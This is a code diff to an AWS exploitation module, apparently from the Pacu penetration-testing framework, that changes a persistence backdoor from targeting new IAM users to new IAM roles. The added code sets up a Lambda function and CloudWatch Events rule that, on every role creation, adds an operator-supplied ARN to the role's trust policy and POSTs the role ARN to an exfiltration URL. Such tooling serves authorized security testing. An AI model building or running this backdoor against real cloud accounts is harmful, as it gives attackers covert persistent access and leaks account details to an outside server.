@@ -9,15 +9,15 @@ import os
 
 
 module_info = {
-    'name': 'lambda__backdoor_new_users',
+    'name': 'lambda__backdoor_new_roles',
 
-    'author': 'Spencer Gietzen of Rhino Security Labs based on code from Daniel Grzelak (https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_created_users_lambda/backdoor_created_users_lambda.py)',
+    'author': 'Spencer Gietzen of Rhino Security Labs based on code from Daniel Grzelak (https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_created_roles_lambda/backdoor_created_roles_lambda.py)',
 
     'category': 'PERSIST',
 
-    'one_liner': 'Creates a Lambda function and CloudWatch Events rule to backdoor new IAM users.',
+    'one_liner': 'Creates a Lambda function and CloudWatch Events rule to backdoor new IAM roles.',
 
-    'description': 'This module creates a new Lambda function and an accompanying CloudWatch Events rule that will trigger upon a new IAM user being created in the account. The function will automatically add a set of access keys to the user and send them to the server you supplied. The function and rule will always be created in us-east-1, as that is the only CloudWatch region that gets sent IAM events. Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.',
+    'description': 'This module creates a new Lambda function and an accompanying CloudWatch Events rule that will trigger upon a new IAM role being created in the account. The function will automatically add the supplied ARN to the assume role policy document and exfiltrate the ARN of the role so you can assume it. The function and rule will always be created in us-east-1, as that is the only CloudWatch region that gets sent IAM events. Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.',
 
     'services': ['Lambda', 'Events', 'IAM'],
 
@@ -25,12 +25,13 @@ module_info = {
 
     'external_dependencies': [],
 
-    'arguments_to_autocomplete': ['--exfil-url', '--cleanup'],
+    'arguments_to_autocomplete': ['--arn', '--exfil-url', '--cleanup'],
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
-parser.add_argument('--exfil-url', required=False, default=None, help='The URL to POST backdoor credentials to, so you can access them.')
+parser.add_argument('--arn', required=False, default=None, help='The ARN of your own IAM user or role that you want to add to the assume role policy document.')
+parser.add_argument('--exfil-url', required=False, default=None, help='The URL to POST backdoored roles\' ARNs to, so you can assume them.')
 parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known backdoors that the module added from the account.')
 
 
@@ -114,11 +115,15 @@ def main(args, pacu_main):
         print('  --exfil-url is required if you are not running in cleanup mode!')
         return
 
+    if not args.arn:
+        print('  --arn is required if you are not running in cleanup mode!')
+        return
+
     data = {'functions_created': 0, 'rules_created': 0, 'successes': 0}
 
     created_resources = {'LambdaFunctions': [], 'CWERules': []}
 
-    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the IAM CreateAccessKey permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
+    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the IAM UpdateAssumeRolePolicy permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
     if not target_role_arn:
         if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
             print('Pre-req module not run successfully. Exiting...')
@@ -135,7 +140,7 @@ def main(args, pacu_main):
     with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
         code = f.read()
 
-    code = code.replace('POST_URL', args.exfil_url)
+    code = code.replace('POST_URL', args.exfil_url).replace('BACKDOOR_ARN', args.arn)
 
     with open('./modules/{}/lambda_function.py'.format(module_info['name']), 'w+') as f:
         f.write(code)
@@ -173,7 +178,7 @@ def main(args, pacu_main):
 
         response = client.put_rule(
             Name=function_name,
-            EventPattern='{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["iam.amazonaws.com"],"eventName":["CreateUser"]}}',
+            EventPattern='{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["iam.amazonaws.com"],"eventName":["CreateRole"]}}',
             State='ENABLED'
         )
         print('  Created CloudWatch Events rule: {}'.format(response['RuleArn']))
